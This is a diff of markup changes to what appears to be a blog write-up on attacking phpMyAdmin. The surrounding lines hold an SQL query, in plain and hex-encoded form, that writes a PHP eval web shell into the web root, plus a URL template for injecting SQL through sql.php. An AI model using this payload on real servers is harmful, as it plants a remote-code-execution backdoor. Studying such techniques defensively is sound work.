@@ -136,11 +136,10 @@
 
 <h4 id="generallywhen-we-want-to-execute-sql-query-like">generally,when we want to execute sql query like</h4>
 
-<div class="language-sql highlighter-rouge"><pre class="highlight"><code><span class="k">select</span> <span class="s1">'&lt;? php @eval($_POST[cmd]);?&gt;'</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'/var/www/1.php'</span>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="s1">'&lt;? php @eval($_POST[cmd]);?&gt;'</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'/var/www/1.php'</span>
 <span class="k">or</span>
 <span class="k">select</span> <span class="mi">0</span><span class="n">x3c3f2070687020406576616c28245f504f53545b636d645d293b3f3e</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'/var/www/1.php'</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="we-will-find-this-does-not-work-here-coz-tbl_sqlphp-was-deletedit-works-out-like-below-404-error-when-i-try-to-execute-above-query">we will find this does not work here coz tbl_sql.php was deleted.It works out like below 404 error when I try to execute above query:</h4>
 <p><img src="../../../../../pic/phpmyadmin/phpmyadmin160413_2.png" /></p>
@@ -151,9 +150,8 @@
 
 <h4 id="-usage">&gt; usage:</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>https://xx.xx.xx/phpmyadmin/sql.php?xxx=xxx...&amp;sql_query=[sqli]
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://xx.xx.xx/phpmyadmin/sql.php?xxx=xxx...&amp;sql_query=[sqli]
+</code></pre></div></div>
 
 <h4 id="-sqli-is-sqlquery-sentence-been-urlencoded">&gt; [sqli] is sqlquery sentence been urlencoded.</h4>
 
